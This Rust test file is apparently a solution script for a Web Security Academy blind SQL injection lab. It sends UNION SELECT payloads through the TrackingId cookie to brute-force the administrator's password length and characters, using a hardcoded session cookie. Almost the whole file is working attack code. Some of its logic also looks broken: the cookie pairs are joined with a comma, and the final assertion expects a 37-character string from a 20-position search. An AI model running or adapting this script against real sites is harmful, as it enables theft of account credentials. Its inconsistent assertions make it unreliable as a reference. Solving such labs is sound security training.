#[cfg(test)]
mod tests {
    use std::{
        collections::{BTreeMap, HashMap},
        sync::{Arc, Mutex},
    };

    use rayon::iter::{IntoParallelIterator, ParallelIterator};
    #[test]
    fn test_sql_brute() {
        let lengths = (1..=20).into_iter().collect::<Vec<i32>>();
        let client = reqwest::blocking::Client::new();
        let url = "https://0a2000170368f048881f715000d6000a.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories";
        lengths.into_par_iter().for_each(|length| {
            let payload = format!("' union select 'a' from users where username='administrator' and length(password)={} -- ", length);
            let payload = urlencoding::encode(&payload).to_string();
            let client = client.clone();
            let request= client
                .get(url)
                .header(
                    "Cookie",
                    format!(
                        "TrackingId={}, session=IjHqZ5CJvozY6yw8wvMzomcTVlAHsPwc",
                        payload
                    ),
                );
            let response = request.send()
                .expect(format!("Failed to send request for payload : {}", payload).as_str());
            if response.text().unwrap().contains("<div>Welcome back!</div>") {
                assert_eq!(20, length);
            }
        });

        let chars = (31..=127)
            .into_iter()
            .map(|i| char::from_u32(i).unwrap())
            .collect::<Vec<char>>();
        let password: Arc<Mutex<BTreeMap<i32, char>>> = Arc::new(Mutex::new(BTreeMap::new()));
        chars.into_iter().for_each(|char| {
            let positions = (1..=20).into_iter().collect::<Vec<i32>>();
            positions.into_par_iter().for_each(|pos| {
                let payload = format!("' union select 'a' from users where username='administrator' and substring(password,{},1)='{}' -- ", pos, char);
                let payload = urlencoding::encode(&payload).to_string();
                let client = client.clone();
                let request= client
                    .get(url)
                    .header(
                        "Cookie",
                        format!(
                            "TrackingId={}, session=IjHqZ5CJvozY6yw8wvMzomcTVlAHsPwc",
                            payload
                        ),
                    );
                let response = request.send()
                    .expect(format!("Failed to send request for payload : {}", payload).as_str());
                if response.text().unwrap().contains("<div>Welcome back!</div>") {
                   println!("Found char: {} at pos: {}", char, pos);
                   password.lock().unwrap().insert(pos, char);
                }
            });
        });
        assert_eq!(
            *password.lock().unwrap().values().collect::<String>(),
            "0123456789abcdefghijklmnopqrstuvwxyzt".to_string()
        );
    }
}
